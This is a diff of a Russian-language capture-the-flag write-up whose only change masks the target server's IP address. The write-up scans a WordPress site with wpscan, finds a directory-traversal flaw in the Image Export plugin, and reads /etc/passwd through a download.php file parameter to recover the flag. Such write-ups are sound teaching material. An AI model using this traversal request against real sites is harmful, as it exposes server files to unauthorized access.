@@ -1,7 +1,7 @@
 Mr.Hacker [Web 150]
 =====================
 > Красивый дизайн, впечатляющие возможности и свобода создавать всё, что вы захотите.
-http://185.17.120.141 (Посмотри на логин этого парня)
+http://185.17....... (Посмотри на логин этого парня)
 
 
 ![alt text](https://github.com/axelmaker/vkactf2018_writeup/blob/master/web/image01.PNG?raw=true)
@@ -13,7 +13,7 @@ http://185.17.120.141 (Посмотри на логин этого парня)
 
 Инициализируем, используя флаги ```--url``` (для указания ip адресса сайта)  ```--enumerate``` (перечисление опций ) ```vp``` (только уязвимые плагины)
 
-```wpscan --url http://185.17.120.141/ --enumerate vp```
+```wpscan --url http://185.17......./ --enumerate vp```
 
 
 В результате сканирования получаем следующую информацию:
@@ -22,8 +22,8 @@ http://185.17.120.141 (Посмотри на логин этого парня)
 [+] We found 1 plugins:
 
 [+] Name: image-export - v4.1
- |  Location: http://185.17.120.141/wp-content/plugins/image-export/
- |  Readme: http://185.17.120.141/wp-content/plugins/image-export/readme.txt
+ |  Location: http://185.17......./wp-content/plugins/image-export/
+ |  Readme: http://185.17......./wp-content/plugins/image-export/readme.txt
 
 [!] Title: Image Export <= 1.1.0 - Directory Traversal
     Reference: https://wpvulndb.com/vulnerabilities/8096
@@ -48,7 +48,7 @@ http://185.17.120.141 (Посмотри на логин этого парня)
 Видим, что с помощью данного экспоита можно получить доступ к файла сервера.
 Применим его к нашему сайту, скачав файл с данными пользователей ```/etc/passwd```
 
-```http://185.17.120.141/wp-content/plugins/image-export/download.php?file=/etc/passwd```
+```http://185.17......./wp-content/plugins/image-export/download.php?file=/etc/passwd```
 
 Открываем файл и внизу обнаруживаем пользователя со странным никнеймом ```th1s_Is_d1r3cT0ryTR4VeRs4l```
 
